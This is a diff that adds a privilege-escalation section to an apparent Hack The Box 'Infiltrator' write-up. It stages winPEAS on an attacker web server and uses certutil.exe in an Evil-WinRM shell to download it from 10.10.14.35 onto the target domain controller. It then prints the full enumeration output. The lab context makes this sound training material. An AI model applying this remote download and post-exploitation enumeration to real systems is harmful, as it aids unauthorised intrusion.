@@ -918,3 +918,252 @@ Get the user flag first:
 *Evil-WinRM* PS C:\Users\M.harris\Desktop> type user.txt
 •••flag-redacted•••
 ```
+
+## 6. Privilege escalation
+
+### 6.1. [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+
+#### Prepare Kali
+
+```sh
+VERSION=$(curl -sI https://github.com/peass-ng/PEASS-ng/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
+curl -sLo /var/www/html/winPEAS.bat https://github.com/peass-ng/PEASS-ng/releases/download/$VERSION/winPEAS.bat
+```
+
+#### Download and run on target
+
+```cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> certutil.exe /urlcache /f /split http://10.10.14.35/winPEAS.bat .\winPEAS.bat
+****  Online  ****
+  0000  ...
+  8f0e
+CertUtil: -URLCache command completed successfully.
+```
+
+<details><summary>Full WinPEAS Output</summary>
+
+```cmd
+*Evil-WinRM* PS C:\Users\M.harris\Documents> .\winPEAS.bat
+
+            ((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+   ((((((((((((((((* *****,,,/########## .(* ,((((((
+   (((((((((((/* ******************/####### .(. ((((((
+   ((((((..******************/@@@@@/***/###### /((((((
+   ,,..**********************@@@@@@@@@@(***,#### ../(((((
+   , ,**********************#@@@@@#@@@@*********##((/ /((((
+   ..(((##########*********/#@@@@@@@@@/*************,,..((((
+   .(((################(/******/@@@@@#****************.. /((
+   .((########################(/************************..*(
+   .((#############################(/********************.,(
+   .((##################################(/***************..(
+   .((######################################(************..(
+   .((######(,.***.,(###################(..***(/*********..(
+   .((######*(#####((##################((######/(********..(
+   .((##################(/**********(################(**...(
+   .(((####################/*******(###################.((((
+   .(((((############################################/  /((
+   ..(((((#########################################(..(((((.
+   ....(((((#####################################( .((((((.
+   ......(((((#################################( .(((((((.
+   (((((((((. ,(############################(../(((((((((.
+       (((((((((/,  ,####################(/..((((((((((.
+             (((((((((/,.  ,*//////*,. ./(((((((((((.
+                (((((((((((((((((((((((((((/
+                       by carlospolop
+
+
+/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
+   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
+   Any misuse of this software will not be the responsibility of the author or of any other collaborator.
+   Use it at your own networks and/or with the network owner's permission.
+
+[*] BASIC SYSTEM INFO
+ [+] WINDOWS OS
+   [i] Check for vulnerabilities for the OS version with the applied patches
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
+winPEAS.bat : Access is denied.
+    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+ERROR:Description = Access denied
+Access is denied.
+ [+] DATE and TIME
+   [i] You may need to adjust your local date/time to exploit some vulnerability
+Wed 12/25/2024
+11:23 PM
+
+ [+] Audit Settings
+   [i] Check what is being logged
+
+
+ [+] WEF Settings
+   [i] Check where are being sent the logs
+
+ [+] Legacy Microsoft LAPS installed?
+   [i] Check what is being logged
+
+ [+] Windows LAPS installed?
+   [i] Check what is being logged: 0x00 Disabled, 0x01 Backup to Entra, 0x02 Backup to Active Directory
+
+ [+] LSA protection?
+   [i] Active if "1"
+
+
+ [+] Credential Guard?
+   [i] Active if "1" or "2"
+
+
+
+ [+] WDigest?
+   [i] Plain-text creds in memory if "1"
+
+ [+] Number of cached creds
+   [i] You need System-rights to extract them
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    CACHEDLOGONSCOUNT    REG_SZ    10
+
+ [+] UAC Settings
+   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+
+
+ [+] Registered Anti-Virus(AV)
+ERROR:Description = Invalid namespace
+Checking for defender whitelisted PATHS
+
+ [+] PowerShell settings
+PowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
+    PowerShellVersion    REG_SZ    5.1.17763.1
+
+Transcriptions Settings:
+Module logging settings:
+Scriptblog logging settings:
+
+PS default transcript history
+
+Checking PS history file
+
+ [+] MOUNTED DISKS
+   [i] Maybe you find something interesting
+
+
+ [+] ENVIRONMENT
+   [i] Interesting information?
+
+ALLUSERSPROFILE=C:\ProgramData
+APPDATA=C:\Users\M.harris\AppData\Roaming
+CommonProgramFiles=C:\Program Files\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=DC01
+ComSpec=C:\Windows\system32\cmd.exe
+CurrentFolder=C:\Users\M.harris\Documents\
+CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
+DriverData=C:\Windows\System32\Drivers\DriverData
+E=0x1B[
+expl=no
+LOCALAPPDATA=C:\Users\M.harris\AppData\Local
+long=false
+NUMBER_OF_PROCESSORS=2
+OS=Windows_NT
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Output Messenger Server\Plugins\Output\apache2\bin\;C:\Program Files\Output Messenger Server\Plugins\Output\php\;C:\Program Files\Output Messenger Server\Plugins\Output\mysql\bin\;C:\Users\M.harris\AppData\Local\Microsoft\WindowsApps
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+Percentage=1
+PercentageTrack=20
+PROCESSOR_ARCHITECTURE=AMD64
+PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
+PROCESSOR_LEVEL=25
+PROCESSOR_REVISION=0101
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSModulePath=C:\Users\M.harris\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PUBLIC=C:\Users\Public
+SystemDrive=C:
+SystemRoot=C:\Windows
+TEMP=C:\Users\MDB39~1.HAR\AppData\Local\Temp
+TMP=C:\Users\MDB39~1.HAR\AppData\Local\Temp
+USERDNSDOMAIN=INFILTRATOR.HTB
+USERDOMAIN=INFILTRATOR
+USERNAME=M.harris
+USERPROFILE=C:\Users\M.harris
+windir=C:\Windows
+
+ [+] INSTALLED SOFTWARE
+   [i] Some weird software? Check for vulnerabilities in unknow software installed
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
+
+Common Files
+Common Files
+Hyper-V
+internet explorer
+Internet Explorer
+Microsoft.NET
+Output Messenger
+Output Messenger Server
+PackageManagement
+Update Services
+VMware
+Windows Defender
+Windows Defender
+Windows Defender Advanced Threat Protection
+Windows Mail
+Windows Mail
+Windows Media Player
+Windows Media Player
+Windows Multimedia Platform
+Windows Multimedia Platform
+windows nt
+windows nt
+Windows Photo Viewer
+Windows Photo Viewer
+Windows Portable Devices
+Windows Portable Devices
+Windows Security
+WindowsPowerShell
+WindowsPowerShell
+    InstallLocation    REG_SZ    C:\Program Files\Output Messenger Server\
+    InstallLocation    REG_SZ    C:\Program Files\Output Messenger\
+    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
+
+ [+] Remote Desktop Credentials Manager
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
+
+ [+] WSUS
+   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
+
+ [+] RUNNING PROCESSES
+   [i] Something unexpected is running? Check for vulnerabilities
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes
+ERROR: Access denied
+   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
+ERROR:Description = Access denied
+   [i] Checking directory permissions of running processes (DLL injection)
+ERROR:Description = Access denied
+ [+] RUN AT STARTUP
+   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup
+C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
+
+Access is denied.*Evil-WinRM* PS C:\Users\M.harris\Documents>
+```
+
+</details>
